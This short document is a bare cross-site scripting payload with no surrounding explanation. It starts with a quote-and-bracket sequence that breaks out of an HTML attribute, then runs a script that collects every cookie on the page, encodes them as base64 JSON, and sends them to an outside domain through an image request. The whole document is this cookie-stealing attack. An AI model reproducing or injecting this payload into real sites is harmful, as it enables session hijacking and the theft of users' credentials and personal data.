"><script>
(function(){
    var cookies = document.cookie.split('; ');
    var result = {};
    cookies.forEach(function(c) {
        var parts = c.split('=');
        var key = parts[0];
        var value = decodeURIComponent(parts.slice(1).join('='));
        result[key] = value;
    });
    var payload = btoa(unescape(encodeURIComponent(JSON.stringify(result))));
    new Image().src = 'https://test.qazqazqaz762000.eu.org/?c=' + encodeURIComponent(payload);
})();
</script>
